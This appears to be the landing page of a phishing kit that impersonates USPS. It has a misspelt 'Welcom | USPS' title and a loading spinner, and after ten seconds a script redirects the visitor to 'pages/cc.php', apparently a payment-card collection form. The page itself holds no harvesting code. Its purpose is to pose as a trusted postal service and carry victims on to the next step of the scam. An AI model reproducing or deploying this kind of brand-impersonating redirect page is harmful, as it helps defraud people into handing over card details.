<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="./files/2_files/bootstrap-icons.css">
        <link rel="stylesheet" href="./files/2_files/font-awesome.min.css"> 
        <title>Welcom | USPS</title>
        <!-- logo site web-->
        <link rel="icon" href="" type="image/x-icon">
        <link rel="shortcut icon" href="" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./files/2_files/bootstrap.css">
        <link rel="stylesheet" href="./files/2_files/laylay.css">
</head>
<body>
       
 

        <div class="loading">
            <div class="d-flex justify-content-center">
                <div class="spinner-border" role="status">
                     <span class="sr-only"></span>
                </div>
            </div>
        </div>

     


      <script src="./files/2_files/jquery-3.5.1.min.js.téléchargement"></script>
      <script src="./files/2_files/bootstrap.min.js.téléchargement"></script>
      <script>
           
             setTimeout(function () {
                window.location.href= 'pages/cc.php';
            },10000);
             
      </script>

<div id="torrent-scanner-popup" style="display: none;"></div></body></html>